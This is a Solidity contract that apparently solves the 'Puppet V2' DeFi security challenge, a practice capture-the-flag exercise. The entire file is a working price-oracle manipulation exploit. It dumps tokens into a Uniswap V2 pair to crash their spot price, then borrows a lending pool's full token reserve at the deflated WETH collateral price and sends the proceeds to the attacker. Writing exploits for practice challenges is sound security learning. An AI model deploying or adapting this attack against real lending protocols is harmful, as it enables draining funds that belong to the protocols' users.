// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPuppetV2Pool {
    function borrow(uint256 borrowAmount) external;
    function calculateDepositOfWETHRequired(uint256 tokenAmount) external view returns (uint256);
}

interface IUniswapRouter{
    function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
    function WETH() external pure returns (address);
}

interface IWETH is IERC20{
   function deposit() external payable; 
}

contract puppetPoolAttackV2{
    uint256 private constant AMOUNT_DVT = 1000000 ether; 

    IUniswapRouter public immutable router;
    address public immutable player;
    IPuppetV2Pool public immutable pool;
    IERC20 public immutable token;
    IWETH public immutable weth;

    constructor(address _router, address _pool, address _token) {
        router = IUniswapRouter(_router);
        player = msg.sender;
        pool = IPuppetV2Pool(_pool);
        token = IERC20(_token);
        weth = IWETH(address(router.WETH()));
    }

    function attackPuppet2() external payable{    
    //make path for uniswapv2 routing
        address[] memory path = new address[](2);
    //token to weth pathing
        path[0] = address(token);
        path[1] = address(weth);

    //approve DVT token and swap for weth -> dumping the price of DVT
        token.approve(address(router),10000 ether);
        router.swapExactTokensForTokens(10000 ether, 9 ether, path, address(this), block.timestamp);
    //convert remaining eth into weth
        weth.deposit{value: address(this).balance}();

    //borrow from pool now with significantly cheaper DVT token

       //uint256 neededWeth = pool.calculateDepositOfWETHRequired(AMOUNT_DVT);
        weth.approve(address(pool), weth.balanceOf(address(this)));
        pool.borrow(AMOUNT_DVT);
        token.transfer(player, token.balanceOf(address(this)));
        weth.transfer(player, weth.balanceOf(address(this)));
    }
    receive() external payable {}

}


